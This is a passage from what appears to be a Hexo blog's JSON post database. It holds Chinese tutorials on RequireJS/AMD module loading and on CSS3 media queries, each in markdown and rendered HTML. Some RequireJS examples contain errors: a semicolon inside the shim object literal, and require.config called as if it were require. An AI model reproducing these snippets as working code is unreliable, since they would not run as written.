    }\n\t\t    }\n\t\t})\n\n\t这样配置后，就可以在其他模块中引用underscore模块：\n\n\t\trequire([\"underscore\"], function(_){\n\t\t    _.each([1,2,3], alert);\n\t\t})\n\n2. 插件形式的非AMD模块。我们经常会用到jquery插件，而这些插件基本都不符合AMD规范，比如jquery.form插件，这时候就需要将form插件shim到jquery中：\n\n\t\trequire.config({\n\t\t    shim: {\n\t\t        \"underscore\" : {\n\t\t            exports : \"_\";\n\t\t        },\n\t\t        \"jquery.form\" : {\n\t\t            deps : [\"jquery\"]\n\t\t        }\n\t\t    }\n\t\t})\n\n\t这样配置之后我们就可以使用加载插件后的jquery了\n\n\t\trequire.config([\"jquery\", \"jquery.form\"], function($){\n\t\t    $(function(){\n\t\t        $(\"#form\").ajaxSubmit({...});\n\t\t    })\n\t\t})\n\n****\n[RequireJS简单教程](http://www.runoob.com/w3cnote/requirejs-tutorial-1.html)\n\n[RequireJS中文网](http://www.requirejs.cn/)","source":"_posts/AMD规范.md","raw":"---\n\ntitle: 【模块化JS】AMD规范\ntags: ['模块化', 'js']\n\n---\n\nAsynchronous Module Definition——异步模块定义\n\n它是一个在浏览器端模块化开发的规范。由于不是Javascript原生支持，使用AMD规范进行页面开发需要用到对应的库函数——**RequireJS**\n\n![RequireJS图标](https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1485016792251&di=e0445002cd2ccabd9c130a8e12d4d1d2&imgtype=0&src=http%3A%2F%2Fwww.uedsc.com%2Fwp-content%2Fuploads%2F2015%2F08%2Frequirejs.jpg)\n\n#### RequireJS主要解决两个问题\n\n1. 多个js文件之间可能存在依赖关系时需要被依赖文件先备加载到浏览器\n2. js文件加载时，加载文件越多，页面失去响应时间越久\n\n<!-- more -->\n\n#### 语法简介\n\n*定义模块*——define([id], [dependencies], factory);\n\n它是全局变量，用于定义模块。\n\n* id：可选，用于定义模块标识。若没有提供该参数，则标识为脚本文件名\n* dependencies：可选，所依赖的模块\n* factory：模块初始化要执行的函数或对象。若为函数，则只被执行一次，若为对象，则此对象应为模块的输出值。\n\n\n*加载模块*——require([dependencies], callback);\n\n* dependencies：数组，表示所依赖的模块\n* callback：回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块。\n\n> 补充：require()函数在加载依赖的函数时是异步加载的，这样浏览器就不会失去响应，它指定的回调函数只有在前面的模块都加载成功后才会运行。由此解决依赖性问题。\n\n### 使用RequireJS\n\n#### 下载\n\n[下载链接](http://www.requirejs.cn/docs/download.html)\n\n#### 添加\n\n假定现在项目中所有js文件都放在一个\"scripts\"目录下，并添加上require.js。\n\n\t* 项目目录/\n\t  * project.html\n\t  * scripts/\n\t     * main.js\n\t     * *require.js*\n\t     * helper/\n\t         * util.js\n\n为了充分利用require.js建议只在HTML中引入require.js，然后通过它来请求加载其他的scripts：\n\n\t<!DOCTYPE html>\n\t<html>\n\t    <head>\n\t        <title>My Sample Project</title>\n\t        <!-- data-main attribute tells require.js to load scripts/main.js after require.js loads. -->\n\t        <script data-main=\"scripts/main\" src=\"scripts/require.js\"></script>\n\t    </head>\n\t    <body>\n\t        <h1>My Sample Project</h1>\n\t    </body>\n\t</html>\n\n* data-main属性：require.js使用它来启动脚本加载过程。\n\n> RequireJS以一个相对于baseUrl的地址来加载所有的代码。而baseUrl有三种方式可以设置。\n\n> 1. 使用上述data-main属性，可设置baseUrl为该属性相一致的目录。上例中为scripts文件夹\n2. 使用RequireJS 的config手动设置。比如在main.js头部添加\n\t\t \trequire.config({\n\t\t\t\tpaths: {\n\t\t\t    \t\tjsFileName: 'FileAddress'\n\t\t\t\t}\n\t\t\t});\n> 3. 如果没有显式指定上述二者，则默认为包含RequireJS的那个HTML页面所属目录。\n\n然后在main.js中使用require()来加载所有需要运行的scripts。\n\n\trequire([\"helper/util\"], function(util) {\n\t    //This function is called when scripts/helper/util.js is loaded.\n\t    //If util.js calls define(), then this function is not fired until\n\t    //util's dependencies have loaded, and the util argument will hold\n\t    //the module value for \"helper/util\".\n\t});\n\n#### 加载文件\n\n以加载一个jQuery库为例。之前都是加载本地js模块，若是需要加载来自本地服务器、其他网站或CDN的js，那么可以用如下方式：\n\n\trequire.config({\n\t    paths : {\n\t        \"jquery\" : [\"http://libs.baidu.com/jquery/2.0.3/jquery\"]   \n\t    }\n\t})\n\trequire([\"jquery\",\"js/a\"],function($){\n\t    $(function(){\n\t        alert(\"load finished\");  \n\t    })\n\t})\n\nrequire.config用来配置模块加载位置。简单点说就是给模块起一个更短更好记的名字，比如将百度的jquery库地址标记为jquery，这样在require时只需要写[\"jquery\"]就可以加载该js。当然，本地的js也可以这样配置。\n\n通过paths的配置会使我们的模块名字更精炼，paths还有一个重要的功能，就是可以配置多个路径，如果远程cdn库没有加载成功，可以加载本地的库，如：\n\n\trequire.config({\n\t    paths : {\n\t        \"jquery\" : [\"http://libs.baidu.com/jquery/2.0.3/jquery\", \"js/jquery\"],\n\t        \"a\" : \"js/a\"   \n\t    }\n\t})\n\trequire([\"jquery\",\"a\"],function($){\n\t    $(function(){\n\t        alert(\"load finished\");  \n\t    })\n\t})\n\n这样配置后，当百度的jquery没有加载成功后，会加载本地js目录下的jquery。\n\n1. 在使用requirejs时，加载模块时不用写.js后缀的，当然也是不能写后缀\n2. 上面例子中的callback函数中发现有$参数，这个就是依赖的jquery模块的输出变量，如果你依赖多个模块，可以依次写入多个参数来使用。\n\n事实上，一般把require.config配置放到data-main中配置，这样就可以使每一个页面都使用这个配置，然后页面中就可以直接使用require来加载所有的短模块名。\n\n*main.js*\n\n\trequire.config({\n\t    paths : {\n\t        \"jquery\" : [\"http://libs.baidu.com/jquery/2.0.3/jquery\", \"js/jquery\"],\n\t        \"a\" : \"js/a\"   \n\t    }\n\t})\n\n*project.html*\n\n\t<script data-main=\"js/main\" src=\"js/require.js\"></script>\n\n##### 加载第三方模块\n\n通过require加载的模块一般都需要符合AMD规范即使用define来申明模块，但是部分时候需要加载非AMD规范的js，这时候就需要用到另一个功能——shim\n\n主要用在两个地方\n\n1. 非AMD模块输出，将非标准的AMD模块\"垫\"成可用的模块，例如：老版本的jquery，并没有继承AMD规范，所以不能直接require[\"jquery\"],这时候就需要shim。比如我要是用underscore类库，但是他并没有实现AMD规范，那么可以这样配置：\n\n\t\trequire.config({\n\t\t    shim: {\n\t\t        \"underscore\" : {\n\t\t            exports : \"_\";\n\t\t        }\n\t\t    }\n\t\t})\n\n\t这样配置后，就可以在其他模块中引用underscore模块：\n\n\t\trequire([\"underscore\"], function(_){\n\t\t    _.each([1,2,3], alert);\n\t\t})\n\n2. 插件形式的非AMD模块。我们经常会用到jquery插件，而这些插件基本都不符合AMD规范，比如jquery.form插件，这时候就需要将form插件shim到jquery中：\n\n\t\trequire.config({\n\t\t    shim: {\n\t\t        \"underscore\" : {\n\t\t            exports : \"_\";\n\t\t        },\n\t\t        \"jquery.form\" : {\n\t\t            deps : [\"jquery\"]\n\t\t        }\n\t\t    }\n\t\t})\n\n\t这样配置之后我们就可以使用加载插件后的jquery了\n\n\t\trequire.config([\"jquery\", \"jquery.form\"], function($){\n\t\t    $(function(){\n\t\t        $(\"#form\").ajaxSubmit({...});\n\t\t    })\n\t\t})\n\n****\n[RequireJS简单教程](http://www.runoob.com/w3cnote/requirejs-tutorial-1.html)\n\n[RequireJS中文网](http://www.requirejs.cn/)","slug":"AMD规范","published":1,"date":"2017-04-04T07:08:59.322Z","updated":"2017-04-22T08:16:41.150Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s2z0000l8slslwxrkin","content":"<p>Asynchronous Module Definition——异步模块定义</p>\n<p>它是一个在浏览器端模块化开发的规范。由于不是Javascript原生支持，使用AMD规范进行页面开发需要用到对应的库函数——<strong>RequireJS</strong></p>\n<p><img src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1485016792251&amp;di=e0445002cd2ccabd9c130a8e12d4d1d2&amp;imgtype=0&amp;src=http%3A%2F%2Fwww.uedsc.com%2Fwp-content%2Fuploads%2F2015%2F08%2Frequirejs.jpg\" alt=\"RequireJS图标\"></p>\n<h4 id=\"RequireJS主要解决两个问题\"><a href=\"#RequireJS主要解决两个问题\" class=\"headerlink\" title=\"RequireJS主要解决两个问题\"></a>RequireJS主要解决两个问题</h4><ol>\n<li>多个js文件之间可能存在依赖关系时需要被依赖文件先备加载到浏览器</li>\n<li>js文件加载时，加载文件越多，页面失去响应时间越久</li>\n</ol>\n<a id=\"more\"></a>\n<h4 id=\"语法简介\"><a href=\"#语法简介\" class=\"headerlink\" title=\"语法简介\"></a>语法简介</h4><p><em>定义模块</em>——define([id], [dependencies], factory);</p>\n<p>它是全局变量，用于定义模块。</p>\n<ul>\n<li>id：可选，用于定义模块标识。若没有提供该参数，则标识为脚本文件名</li>\n<li>dependencies：可选，所依赖的模块</li>\n<li>factory：模块初始化要执行的函数或对象。若为函数，则只被执行一次，若为对象，则此对象应为模块的输出值。</li>\n</ul>\n<p><em>加载模块</em>——require([dependencies], callback);</p>\n<ul>\n<li>dependencies：数组，表示所依赖的模块</li>\n<li>callback：回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块。</li>\n</ul>\n<blockquote>\n<p>补充：require()函数在加载依赖的函数时是异步加载的，这样浏览器就不会失去响应，它指定的回调函数只有在前面的模块都加载成功后才会运行。由此解决依赖性问题。</p>\n</blockquote>\n<h3 id=\"使用RequireJS\"><a href=\"#使用RequireJS\" class=\"headerlink\" title=\"使用RequireJS\"></a>使用RequireJS</h3><h4 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h4><p><a href=\"http://www.requirejs.cn/docs/download.html\" target=\"_blank\" rel=\"external\">下载链接</a></p>\n<h4 id=\"添加\"><a href=\"#添加\" class=\"headerlink\" title=\"添加\"></a>添加</h4><p>假定现在项目中所有js文件都放在一个”scripts”目录下，并添加上require.js。</p>\n<pre><code>* 项目目录/\n  * project.html\n  * scripts/\n     * main.js\n     * *require.js*\n     * helper/\n         * util.js\n</code></pre><p>为了充分利用require.js建议只在HTML中引入require.js，然后通过它来请求加载其他的scripts：</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;My Sample Project&lt;/title&gt;\n        &lt;!-- data-main attribute tells require.js to load scripts/main.js after require.js loads. --&gt;\n        &lt;script data-main=&quot;scripts/main&quot; src=&quot;scripts/require.js&quot;&gt;&lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;h1&gt;My Sample Project&lt;/h1&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre><ul>\n<li>data-main属性：require.js使用它来启动脚本加载过程。</li>\n</ul>\n<blockquote>\n<p>RequireJS以一个相对于baseUrl的地址来加载所有的代码。而baseUrl有三种方式可以设置。</p>\n<ol>\n<li>使用上述data-main属性，可设置baseUrl为该属性相一致的目录。上例中为scripts文件夹</li>\n<li>使用RequireJS 的config手动设置。比如在main.js头部添加<pre><code> require.config({\n    paths: {\n            jsFileName: &apos;FileAddress&apos;\n    }\n});\n</code></pre></li>\n<li>如果没有显式指定上述二者，则默认为包含RequireJS的那个HTML页面所属目录。</li>\n</ol>\n</blockquote>\n<p>然后在main.js中使用require()来加载所有需要运行的scripts。</p>\n<pre><code>require([&quot;helper/util&quot;], function(util) {\n    //This function is called when scripts/helper/util.js is loaded.\n    //If util.js calls define(), then this function is not fired until\n    //util&apos;s dependencies have loaded, and the util argument will hold\n    //the module value for &quot;helper/util&quot;.\n});\n</code></pre><h4 id=\"加载文件\"><a href=\"#加载文件\" class=\"headerlink\" title=\"加载文件\"></a>加载文件</h4><p>以加载一个jQuery库为例。之前都是加载本地js模块，若是需要加载来自本地服务器、其他网站或CDN的js，那么可以用如下方式：</p>\n<pre><code>require.config({\n    paths : {\n        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;]   \n    }\n})\nrequire([&quot;jquery&quot;,&quot;js/a&quot;],function($){\n    $(function(){\n        alert(&quot;load finished&quot;);  \n    })\n})\n</code></pre><p>require.config用来配置模块加载位置。简单点说就是给模块起一个更短更好记的名字，比如将百度的jquery库地址标记为jquery，这样在require时只需要写[“jquery”]就可以加载该js。当然，本地的js也可以这样配置。</p>\n<p>通过paths的配置会使我们的模块名字更精炼，paths还有一个重要的功能，就是可以配置多个路径，如果远程cdn库没有加载成功，可以加载本地的库，如：</p>\n<pre><code>require.config({\n    paths : {\n        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;, &quot;js/jquery&quot;],\n        &quot;a&quot; : &quot;js/a&quot;   \n    }\n})\nrequire([&quot;jquery&quot;,&quot;a&quot;],function($){\n    $(function(){\n        alert(&quot;load finished&quot;);  \n    })\n})\n</code></pre><p>这样配置后，当百度的jquery没有加载成功后，会加载本地js目录下的jquery。</p>\n<ol>\n<li>在使用requirejs时，加载模块时不用写.js后缀的，当然也是不能写后缀</li>\n<li>上面例子中的callback函数中发现有$参数，这个就是依赖的jquery模块的输出变量，如果你依赖多个模块，可以依次写入多个参数来使用。</li>\n</ol>\n<p>事实上，一般把require.config配置放到data-main中配置，这样就可以使每一个页面都使用这个配置，然后页面中就可以直接使用require来加载所有的短模块名。</p>\n<p><em>main.js</em></p>\n<pre><code>require.config({\n    paths : {\n        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;, &quot;js/jquery&quot;],\n        &quot;a&quot; : &quot;js/a&quot;   \n    }\n})\n</code></pre><p><em>project.html</em></p>\n<pre><code>&lt;script data-main=&quot;js/main&quot; src=&quot;js/require.js&quot;&gt;&lt;/script&gt;\n</code></pre><h5 id=\"加载第三方模块\"><a href=\"#加载第三方模块\" class=\"headerlink\" title=\"加载第三方模块\"></a>加载第三方模块</h5><p>通过require加载的模块一般都需要符合AMD规范即使用define来申明模块，但是部分时候需要加载非AMD规范的js，这时候就需要用到另一个功能——shim</p>\n<p>主要用在两个地方</p>\n<ol>\n<li><p>非AMD模块输出，将非标准的AMD模块”垫”成可用的模块，例如：老版本的jquery，并没有继承AMD规范，所以不能直接require[“jquery”],这时候就需要shim。比如我要是用underscore类库，但是他并没有实现AMD规范，那么可以这样配置：</p>\n<pre><code>require.config({\n    shim: {\n        &quot;underscore&quot; : {\n            exports : &quot;_&quot;;\n        }\n    }\n})\n</code></pre><p> 这样配置后，就可以在其他模块中引用underscore模块：</p>\n<pre><code>require([&quot;underscore&quot;], function(_){\n    _.each([1,2,3], alert);\n})\n</code></pre></li>\n<li><p>插件形式的非AMD模块。我们经常会用到jquery插件，而这些插件基本都不符合AMD规范，比如jquery.form插件，这时候就需要将form插件shim到jquery中：</p>\n<pre><code>require.config({\n    shim: {\n        &quot;underscore&quot; : {\n            exports : &quot;_&quot;;\n        },\n        &quot;jquery.form&quot; : {\n            deps : [&quot;jquery&quot;]\n        }\n    }\n})\n</code></pre><p> 这样配置之后我们就可以使用加载插件后的jquery了</p>\n<pre><code>require.config([&quot;jquery&quot;, &quot;jquery.form&quot;], function($){\n    $(function(){\n        $(&quot;#form&quot;).ajaxSubmit({...});\n    })\n})\n</code></pre></li>\n</ol>\n<hr>\n<p><a href=\"http://www.runoob.com/w3cnote/requirejs-tutorial-1.html\" target=\"_blank\" rel=\"external\">RequireJS简单教程</a></p>\n<p><a href=\"http://www.requirejs.cn/\" target=\"_blank\" rel=\"external\">RequireJS中文网</a></p>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<p>Asynchronous Module Definition——异步模块定义</p>\n<p>它是一个在浏览器端模块化开发的规范。由于不是Javascript原生支持，使用AMD规范进行页面开发需要用到对应的库函数——<strong>RequireJS</strong></p>\n<p><img src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1485016792251&amp;di=e0445002cd2ccabd9c130a8e12d4d1d2&amp;imgtype=0&amp;src=http%3A%2F%2Fwww.uedsc.com%2Fwp-content%2Fuploads%2F2015%2F08%2Frequirejs.jpg\" alt=\"RequireJS图标\"></p>\n<h4 id=\"RequireJS主要解决两个问题\"><a href=\"#RequireJS主要解决两个问题\" class=\"headerlink\" title=\"RequireJS主要解决两个问题\"></a>RequireJS主要解决两个问题</h4><ol>\n<li>多个js文件之间可能存在依赖关系时需要被依赖文件先备加载到浏览器</li>\n<li>js文件加载时，加载文件越多，页面失去响应时间越久</li>\n</ol>","more":"<h4 id=\"语法简介\"><a href=\"#语法简介\" class=\"headerlink\" title=\"语法简介\"></a>语法简介</h4><p><em>定义模块</em>——define([id], [dependencies], factory);</p>\n<p>它是全局变量，用于定义模块。</p>\n<ul>\n<li>id：可选，用于定义模块标识。若没有提供该参数，则标识为脚本文件名</li>\n<li>dependencies：可选，所依赖的模块</li>\n<li>factory：模块初始化要执行的函数或对象。若为函数，则只被执行一次，若为对象，则此对象应为模块的输出值。</li>\n</ul>\n<p><em>加载模块</em>——require([dependencies], callback);</p>\n<ul>\n<li>dependencies：数组，表示所依赖的模块</li>\n<li>callback：回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块。</li>\n</ul>\n<blockquote>\n<p>补充：require()函数在加载依赖的函数时是异步加载的，这样浏览器就不会失去响应，它指定的回调函数只有在前面的模块都加载成功后才会运行。由此解决依赖性问题。</p>\n</blockquote>\n<h3 id=\"使用RequireJS\"><a href=\"#使用RequireJS\" class=\"headerlink\" title=\"使用RequireJS\"></a>使用RequireJS</h3><h4 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h4><p><a href=\"http://www.requirejs.cn/docs/download.html\">下载链接</a></p>\n<h4 id=\"添加\"><a href=\"#添加\" class=\"headerlink\" title=\"添加\"></a>添加</h4><p>假定现在项目中所有js文件都放在一个”scripts”目录下，并添加上require.js。</p>\n<pre><code>* 项目目录/\n  * project.html\n  * scripts/\n     * main.js\n     * *require.js*\n     * helper/\n         * util.js\n</code></pre><p>为了充分利用require.js建议只在HTML中引入require.js，然后通过它来请求加载其他的scripts：</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;My Sample Project&lt;/title&gt;\n        &lt;!-- data-main attribute tells require.js to load scripts/main.js after require.js loads. --&gt;\n        &lt;script data-main=&quot;scripts/main&quot; src=&quot;scripts/require.js&quot;&gt;&lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;h1&gt;My Sample Project&lt;/h1&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre><ul>\n<li>data-main属性：require.js使用它来启动脚本加载过程。</li>\n</ul>\n<blockquote>\n<p>RequireJS以一个相对于baseUrl的地址来加载所有的代码。而baseUrl有三种方式可以设置。</p>\n<ol>\n<li>使用上述data-main属性，可设置baseUrl为该属性相一致的目录。上例中为scripts文件夹</li>\n<li>使用RequireJS 的config手动设置。比如在main.js头部添加<pre><code> require.config({\n    paths: {\n            jsFileName: &apos;FileAddress&apos;\n    }\n});\n</code></pre></li>\n<li>如果没有显式指定上述二者，则默认为包含RequireJS的那个HTML页面所属目录。</li>\n</ol>\n</blockquote>\n<p>然后在main.js中使用require()来加载所有需要运行的scripts。</p>\n<pre><code>require([&quot;helper/util&quot;], function(util) {\n    //This function is called when scripts/helper/util.js is loaded.\n    //If util.js calls define(), then this function is not fired until\n    //util&apos;s dependencies have loaded, and the util argument will hold\n    //the module value for &quot;helper/util&quot;.\n});\n</code></pre><h4 id=\"加载文件\"><a href=\"#加载文件\" class=\"headerlink\" title=\"加载文件\"></a>加载文件</h4><p>以加载一个jQuery库为例。之前都是加载本地js模块，若是需要加载来自本地服务器、其他网站或CDN的js，那么可以用如下方式：</p>\n<pre><code>require.config({\n    paths : {\n        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;]   \n    }\n})\nrequire([&quot;jquery&quot;,&quot;js/a&quot;],function($){\n    $(function(){\n        alert(&quot;load finished&quot;);  \n    })\n})\n</code></pre><p>require.config用来配置模块加载位置。简单点说就是给模块起一个更短更好记的名字，比如将百度的jquery库地址标记为jquery，这样在require时只需要写[“jquery”]就可以加载该js。当然，本地的js也可以这样配置。</p>\n<p>通过paths的配置会使我们的模块名字更精炼，paths还有一个重要的功能，就是可以配置多个路径，如果远程cdn库没有加载成功，可以加载本地的库，如：</p>\n<pre><code>require.config({\n    paths : {\n        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;, &quot;js/jquery&quot;],\n        &quot;a&quot; : &quot;js/a&quot;   \n    }\n})\nrequire([&quot;jquery&quot;,&quot;a&quot;],function($){\n    $(function(){\n        alert(&quot;load finished&quot;);  \n    })\n})\n</code></pre><p>这样配置后，当百度的jquery没有加载成功后，会加载本地js目录下的jquery。</p>\n<ol>\n<li>在使用requirejs时，加载模块时不用写.js后缀的，当然也是不能写后缀</li>\n<li>上面例子中的callback函数中发现有$参数，这个就是依赖的jquery模块的输出变量，如果你依赖多个模块，可以依次写入多个参数来使用。</li>\n</ol>\n<p>事实上，一般把require.config配置放到data-main中配置，这样就可以使每一个页面都使用这个配置，然后页面中就可以直接使用require来加载所有的短模块名。</p>\n<p><em>main.js</em></p>\n<pre><code>require.config({\n    paths : {\n        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;, &quot;js/jquery&quot;],\n        &quot;a&quot; : &quot;js/a&quot;   \n    }\n})\n</code></pre><p><em>project.html</em></p>\n<pre><code>&lt;script data-main=&quot;js/main&quot; src=&quot;js/require.js&quot;&gt;&lt;/script&gt;\n</code></pre><h5 id=\"加载第三方模块\"><a href=\"#加载第三方模块\" class=\"headerlink\" title=\"加载第三方模块\"></a>加载第三方模块</h5><p>通过require加载的模块一般都需要符合AMD规范即使用define来申明模块，但是部分时候需要加载非AMD规范的js，这时候就需要用到另一个功能——shim</p>\n<p>主要用在两个地方</p>\n<ol>\n<li><p>非AMD模块输出，将非标准的AMD模块”垫”成可用的模块，例如：老版本的jquery，并没有继承AMD规范，所以不能直接require[“jquery”],这时候就需要shim。比如我要是用underscore类库，但是他并没有实现AMD规范，那么可以这样配置：</p>\n<pre><code>require.config({\n    shim: {\n        &quot;underscore&quot; : {\n            exports : &quot;_&quot;;\n        }\n    }\n})\n</code></pre><p> 这样配置后，就可以在其他模块中引用underscore模块：</p>\n<pre><code>require([&quot;underscore&quot;], function(_){\n    _.each([1,2,3], alert);\n})\n</code></pre></li>\n<li><p>插件形式的非AMD模块。我们经常会用到jquery插件，而这些插件基本都不符合AMD规范，比如jquery.form插件，这时候就需要将form插件shim到jquery中：</p>\n<pre><code>require.config({\n    shim: {\n        &quot;underscore&quot; : {\n            exports : &quot;_&quot;;\n        },\n        &quot;jquery.form&quot; : {\n            deps : [&quot;jquery&quot;]\n        }\n    }\n})\n</code></pre><p> 这样配置之后我们就可以使用加载插件后的jquery了</p>\n<pre><code>require.config([&quot;jquery&quot;, &quot;jquery.form&quot;], function($){\n    $(function(){\n        $(&quot;#form&quot;).ajaxSubmit({...});\n    })\n})\n</code></pre></li>\n</ol>\n<hr>\n<p><a href=\"http://www.runoob.com/w3cnote/requirejs-tutorial-1.html\">RequireJS简单教程</a></p>\n<p><a href=\"http://www.requirejs.cn/\">RequireJS中文网</a></p>"},{"title":"CSS3媒体查询","_content":"\n> 移动浪潮的到来，促使web的主战场从PC迁移到了Mobile。于是为了适应各式各样的设备尺寸，出现了响应式设计模型。而这一设计的核心，便是CSS的Media媒体查询器。\n\n<!-- more -->\n\n## meta标签\n\n先介绍一下HTML的meta标签。`<meta>`可提供有关某个 HTML 元素的元信息 (meta-information)，比如描述、针对搜索引擎的关键词以及刷新频率。\n\n它有以下几个属性：\n\n|属性\t\t|描述\t|\n|-----------|-------|\n|content\t|设置或返回 <meta> 元素的 content 属性的值。|\n|httpEquiv\t|把 content 属性连接到一个 HTTP 头部。|\n|name\t\t|把 content 属性连接到某个名称。|\n|scheme\t\t|设置或返回用于解释 content 属性的值的格式。|\n\n而在响应式中我们常常这么设置(IE9及以上)：\n\n\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n\n参数说明：\n\n* width = device-width：宽度等于当前设备的宽度\n* initial-scale：初始的缩放比例（默认设置为1.0）  \n* minimum-scale：允许用户缩放到的最小比例（默认设置为1.0）    \n* maximum-scale：允许用户缩放到的最大比例（默认设置为1.0）   \n* user-scalable：用户是否可以手动缩放（默认设置为no，因为我们不希望用户放大缩小页面） \n\n还有这个：\n\n\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge，chrome=1\">\n\n这个主要是为了防止有的用户IE升级到IE9以上了而浏览器的文档模式却是IE8。最后的`chrome=1`代表`[Google Chrome Frame（谷歌内嵌浏览器框架GCF）](http://zh.wikipedia.org/wiki/Google_Chrome_Frame)`.如果有的用户电脑里面装了这个chrome的插件，就可以让电脑里面的IE不管是哪个版本的都可以使用Webkit引擎及V8引擎进行排版及运算，如果用户没装这个插件，那这段代码就会让IE以最高的文档模式展现效果。\n\n> IE8既不支持HTML5也不支持CSS3 Media,所以如果需要兼容，则需要引入一下两个js文件\n>\n>\t<!--[if lt IE 9]>\n\t  <script src=\"https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js\"></script>\n\t  <script src=\"https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js\"></script>\n\t<![endif]-->\n>\n> 顺便，复习一下[CSS条件注释](http://www.cnblogs.com/fm168/p/5526702.html)\n\n## CSS3 Media\n\n### 语法\n\n\t@media mediatype and|not|only (media feature) {\n\t    CSS-Code;\n\t}\n\n或者使用引用link\n\n\t<link rel=\"stylesheet\" media=\"mediatype and|not|only (media feature)\" href=\"mystylesheet.css\">\n\n其中`mediatype`主要有:\n\n* all: 用于所有设备\n* print:　用于打印机和打印预览\n* screen: 用于电脑屏幕，平板电脑，智能手机等。\n* speech: 用于屏幕阅读器等发声设备\n\n`media feature`主要有:\n\n|值\t|描述|\n|---|----|\n|aspect-ratio\t|定义输出设备中的页面可见区域宽度与高度的比率|\n|color\t|定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0|\n|color-index\t|定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0|\n|device-aspect-ratio\t|定义输出设备的屏幕可见宽度与高度的比率。|\n|device-height\t|定义输出设备的屏幕可见高度。|\n|device-width\t|定义输出设备的屏幕可见宽度。|\n|grid\t|用来查询输出设备是否使用栅格或点阵。|\n|height\t|定义输出设备中的页面可见区域高度。|\n|max-aspect-ratio\t|定义输出设备的屏幕可见宽度与高度的最大比率。|\n|max-color\t|定义输出设备每一组彩色原件的最大个数。|\n|max-color-index\t|定义在输出设备的彩色查询表中的最大条目数。|\n|max-device-aspect-ratio\t|定义输出设备的屏幕可见宽度与高度的最大比率。|\n|max-device-height\t|定义输出设备的屏幕可见的最大高度。|\n|max-device-width\t|定义输出设备的屏幕最大可见宽度。|\n|max-height\t|定义输出设备中的页面最大可见区域高度。|\n|max-monochrome\t|定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。|\n|max-resolution\t|定义设备的最大分辨率。|\n|max-width\t|定义输出设备中的页面最大可见区域宽度。|\n|min-aspect-ratio\t|定义输出设备中的页面可见区域宽度与高度的最小比率。|\n|min-color\t|定义输出设备每一组彩色原件的最小个数。|\n|min-color-index\t|定义在输出设备的彩色查询表中的最小条目数。|\n|min-device-aspect-ratio\t|定义输出设备的屏幕可见宽度与高度的最小比率。|\n|min-device-width\t|定义输出设备的屏幕最小可见宽度。|\n|min-device-height\t|定义输出设备的屏幕的最小可见高度。|\n|min-height\t|定义输出设备中的页面最小可见区域高度。|\n|min-monochrome\t|定义在一个单色框架缓冲区中每像素包含的最小单色原件个数|\n|min-resolution\t|定义设备的最小分辨率。|\n|min-width\t|定义输出设备中的页面最小可见区域宽度。|\n|monochrome\t|定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0|\n|orientation\t|定义输出设备中的页面可见区域高度是否大于或等于宽度。|\n|resolution\t|定义设备的分辨率。如：96dpi, 300dpi, 118dpcm|\n|scan\t|定义电视类设备的扫描工序。|\n|width\t|定义输出设备中的页面可见区域宽度。|\n\n### 举例\n\n\t@media screen and (max-width: 960px){\n\t    body{\n\t        background: #000;\n\t    }\n\t}\n\n上面这段CSS代码意思是：当页面小于960px的时候执行这一段CSS。\n\n也可以省略screen(不考虑用户打印等其他需求)，直接\n\n\t@media (max-width: 960px){\n\t    body{\n\t        background: #000;\n\t    }\n\t}\n\n再比如：\n\n\t@media screen and (max-device-width:960px){\n\t    body{\n\t        background:red;\n\t    }\n\t}\n\n实现等于960px尺寸的代码\n\n或者混合：\n\n\t@media screen and (min-width:960px) and (max-width:1200px){\n\t    body{\n\t        background:yellow;\n\t    }\n\t}\n\n****\n\n参考链接\n\n* [HTML DOM Meta 对象](http://www.runoob.com/jsref/dom-obj-meta.html)\n* [css3 media媒体查询器用法总结--来自520UED](http://www.520ued.com/article/53882d7ab992a7c43f5c204b)","source":"_posts/CSS3媒体查询.md","raw":"---\n\ntitle: CSS3媒体查询\ntags: ['响应式', 'CSS']\n\n---\n\n> 